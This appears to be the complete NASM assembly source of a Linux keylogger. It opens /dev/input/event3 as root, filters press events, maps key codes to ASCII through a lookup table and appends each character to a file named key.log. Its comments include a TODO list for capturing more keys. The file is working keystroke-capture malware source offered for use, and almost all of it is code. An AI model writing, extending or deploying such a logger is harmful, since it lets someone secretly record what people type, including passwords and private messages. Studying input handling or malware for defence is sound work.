; See:
; /usr/include/asm-generic/fcntl.h        --  for file flags
; /usr/include/linux/input-event-codes.h  --  for understanding the input format


SECTION .data
    ;------------------------
    ; Change output destination here
    dest   db "key.log", 0              ; Location where the key log will be saved
    source db "/dev/input/event3", 0    ; Reading key strokes from here

    toASCII db `??1234567890-=\b\tQWERTYUIOP[]\n?ASDFGHJKL;'???ZXCVBNM,./??? ???????????????????`
            db `????????????????????????????????????????????????????????????????????????????????`

    errMsg db "Error: Program must be ran as root", 0xa
    lenErrMsg equ $ - errMsg
    

SECTION .bss
    input_event resb 16
;   This is what we read from /dev/input/event3:
;
;   struct input_event {
;       struct timeval time; (8 byte) -- Time of the event
;       unsigned short type; (2 byte) -- Type of event. For keyboard its EV_KEY=0x01
;       unsigned short code; (2 byte) -- Event code. The pressed key is stored here
;       unsigned int value;  (4 byte) -- In our case its 0 for release and 1 for press
;   };
;
;   For more, see: https://www.kernel.org/doc/Documentation/input/input.txt
    
SECTION .text

global _start
    

;
;---------------------------------------------------------------
; Algorithm:
;   1. Ready files for writing and reading
;   2. Read from /dev/input/event3
;   3. Check if key is valid
;   4. Translate key into ASCII
;   5. Jump to step 2.
; Notes:
;   Currently this tool doesn't support upper and lower cases
;---------------------------------------------------------------
; TODO:
;   1. Implement shift and caps lock capturing
;   2. Capture more keys (F1-F9, numpads, ctrl, alt...)
;   3. Create new section in output on every launch (time header)
;---------------------------------------------------------------
;


_start:
    nop

    ; Open /dev/input/event3 for reading
    xor ecx, ecx                    ; O_RDONLY
    mov ebx, source                 ; "/dev/input/event3"
    mov eax, 5                      ; SYS_OPEN
    int 0x80                        ; call the kernel

    ; Check if we could open file
    cmp eax, 0xfffffff3
    je error

    mov esi, eax                    ; Save file descriptor in ESI

    ; Open dest for writing
    mov edx, 420                    ; S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH (644)
    mov ecx, 2101o                  ; O_WRONLY | O_CREAT | O_APPEND
    mov ebx, dest                   ; The output destination. "key.log" by default
    mov eax, 5                      ; SYS_OPEN
    int 0x80

    mov edi, eax                    ; Save file descriptor in EDI

    ; ESI -> File descriptor for source file. 
    ;        We will read key strokes from here
    ;
    ; EDI -> File descriptor for destination file.
    ;        We will forward the keystrokes here

log:
    ; Get last keystroke
    mov edx, 16                     ; Read 16 bytes
    mov ecx, input_event            ; Store result here
    mov ebx, esi                    ; Pass file descriptor
    mov eax, 3                      ; SYS_READ
    int 0x80                        ; syscall

    ; Check if given keystroke is important
    mov byte al, [input_event + 8]  ; Get input_event.type
    cmp ax, 0                       ; Is event.type == EV_SYN?
    je log                          ; If so, skip current keystroke
    cmp ax, 4                       ; Is event.type == EV_MSC?
    je log                          ; If so, skip current keystroke

    ; Check if its just a release key
    mov byte al, [input_event + 12] ; Move to event.value
    cmp al, 0                       ; Is event.val == 0? (key release)
    je log                          ; If so, skip current keystroke

    ; Translate the event key to ASCII character
    mov byte al, [ecx + 10]         ; Take first byte from event.code (where key is kept)
    mov byte bl, [toASCII + eax]    ; Translate and put character in BL
    push ebx                        ; Push the character

    ; Save the keystroke
    mov edx, 1                      ; Write 1 byte (char)
    mov ecx, esp                    ; Write the saved character
    mov ebx, edi                    ; Pass file descriptor
    mov eax, 4                      ; SYS_WRITE
    int 0x80                        ; syscall

    pop eax                         ; Remove the saved character from stack

    jmp log

    ; Exit
    mov eax, 1
    int 0x80


; We will jump here if program isn't run as root
error:
    mov eax, 4              ; SYS_WRITE
    mov ebx, 2              ; stderr
    mov ecx, errMsg         ; Message to print
    mov edx, lenErrMsg      ; Message size
    int 0x80                ; syscall

    mov eax, 1
    int 0x80
    ret
